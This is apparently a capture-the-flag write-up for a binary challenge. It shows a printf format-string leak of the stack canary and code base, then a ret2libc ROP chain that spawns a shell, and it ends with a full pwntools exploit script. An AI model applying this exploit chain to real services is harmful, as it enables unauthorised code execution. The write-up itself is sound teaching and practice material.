# Reverse

Firstly we run `checksec` on the binary.

![aa](<buy-coofeeImages/Pasted image 20240929131928.png>)

We see that we have all the important protections enabled. Quite scarry at first sight right?

We load up the binary in Ghidra and the execution flow reaches this function, `coffee()`

![aa](<buy-coofeeImages/Pasted image 20240929132209.png>)

We see that indeed we have a canary and a buffer of 24 bytes on the stack. But on line `15` we see the vulnerability an `fread()` call that reads up to 80 characters in the buffer (including null bytes).

# Pwning

## Bypass Canary and PIE

How do we bypass the stack canary though to redirect the execution flow? Only if we could leak things from the stack. 

Luckily we can, on line 12 there is a `printf()` Format String Vulnerability, this allows us to leak contents from the stack including the canary.

By using `%n$lX` we can print the n-th argument passed to `printf()`. Let's look at the calling convention on `x86-64`.
![aa](<buy-coofeeImages/Pasted image 20240929133412.png>)

We see that on Linux we pass the parameters in the following order:
- RDI
- RSI
- RDX
- RCX
- R8
- R9
- Stack

So **RDI** will be at offset 0, **RSI** at offset 1 and so on, this means that the first argument from the stack is at offset 6. Let's take a look at the stack when we enter the `printf()` function.

![aa](<buy-coofeeImages/Pasted image 20240929133657.png>)

We see that at `rsp+0x08` we have the 6th argument passed to `printf()`, our string. At `rsp+32` which is the `9th` argument passed to `printf()` we have the stack canary. 
Moreover at `rbp+0x08` or at `rsp+48` or the `11th` argument on the stack we have the return address of the `printf()` call, which returns in main, in `main+78` to be more specific.

So by supplying `%9$lX %11$lX` as input to the `printf()` function we will get these two values separated by a space.

```
[*] Output  FA221527F3AC6B00 56555153C332
```

Now we can safely overwrite the return address and redirect the execution flow. We can perform a `ret2libc` attack. The simplest way to do so is to call `system()` with the argument of `/bin/sh`. 

Following the syscall convention of x86-64 we need to pass the address of `/bin/sh`(the **libc** contains the string `/bin/sh`) by the **RDI** register. 

## Ret2libc

We use `ROPgadget` to find the `pop rdi ; ret` and we find one.
![aa](<buy-coofeeImages/Pasted image 20240929134909.png>)
We cannot just jump to the gadget's location because remember the binary is compiled as **PIE** enabled. So we need to calculate where to jump based on the leaked `main+78` address and the offset between `main+78` and the gadget in the code.

```python
#main+78        0x00101332
#pop rdi; ret   0x001013b3
rop_gadget_addr = main78 + 0x81
```

The script also outputs the address of the `printf()` function from libc and we also received the library used by the challenge (2.31). Using these two we can pinpoint the version used by the binary exactly using **libc-database**. In this case it is `libc6_2.31-0ubuntu9.9_amd64`.

![aa](<buy-coofeeImages/Pasted image 20240929140201.png>)

From here we calculate the offsets to the string `/bin/sh` and `system()`.
```python
system_addr = printfAddr - 0xFA00
bin_sh_addr = printfAddr + 0x15292D
```

## Exploit
We chain everything together and let's do not forget of the extra `ret` needed for the `MOVAPS` instruction.

```python
from pwn import *
import logging

context.log_level='DEBUG'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb_script = f"""
"""

io = gdb.debug('./buy_me_coffee_patched', gdbscript = gdb_script)
#io = remote("34.159.156.124", 32123)

output = io.recvuntil('$')

io.sendline('%9$lX %11$lX') # 9 canary; 11 main+78

output = io.clean(timeout=1)

log.info("Output " + output.decode())
log.success("Canary: " + output.decode().split(' ')[1])
log.success("Main78:" + output.decode().split('W')[0].split(' ')[2])
log.success("Code base: " + str(hex(int(output.decode().split('W')[0].split(' ')[2], 16) - 0x1332)))

canary = int(output.decode().split(' ')[1], 16)
main78 = int(output.decode().split('W')[0].split(' ')[2], 16)
  
printfAddr = int(output.decode().split(' ')[5].split('\n')[0], 16)
log.success("Printf address: "+ output.decode().split(' ')[5].split('\n')[0])

system_addr = printfAddr - 0xFA00
bin_sh_addr = printfAddr + 0x15292D

#main+78        0x00101332
#pop rdi; ret   0x001013b3
rop_gadget_addr = main78 + 0x81
just_a_ret = main78 - 0x10c

payload = b'A' * 24
payload += p64(canary)
payload += b'B' * 8     #skip saved RBP

payload += p64(just_a_ret)
payload += p64(rop_gadget_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

io.sendline(payload)
io.interactive()
```

## Flag

Last we run it on remote and get the flag! :)
![aa](<buy-coofeeImages/Pasted image 20240929142109.png>)
